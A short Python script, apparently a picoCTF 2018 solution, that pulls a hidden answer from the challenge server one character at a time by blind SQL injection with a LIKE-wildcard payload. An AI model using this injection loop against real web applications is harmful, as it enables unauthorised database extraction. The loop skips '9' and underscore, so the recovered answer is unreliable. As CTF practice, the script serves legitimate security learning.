# coding=utf-8
import requests
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

answer=''
try_chr=48

#chr 是把ascii的數字轉字元， ord則是把字元轉ascii數字
while try_chr!=91:
  #post到那個網站
  r=requests.post('http://2018shell3.picoctf.com:36052/answer2.php',
    data={
      'answer':"1' OR answer LIKE '"+answer+chr(try_chr)+"%'--", # %在 LIKE中為萬用字元
      'debug':'1'
    }
  )
  #轉碼
  result=r.content.decode('big5')
  #確認是不是對的
  if result.find('You are so close.')!=-1:
    answer+=chr(try_chr)
    print(chr(try_chr))
    try_chr=48
  #因為LIKE不分大小寫，所以只要考慮65~90，不用考慮97~122
  else:
    try_chr+=1
    if try_chr==57:
      try_chr=65

print(answer) #41ANDSIXSIXTHS

#可是出來的都是大寫欸，不一定對阿，那怎麼辦? 請看ASIMPLEQUESTION_2.py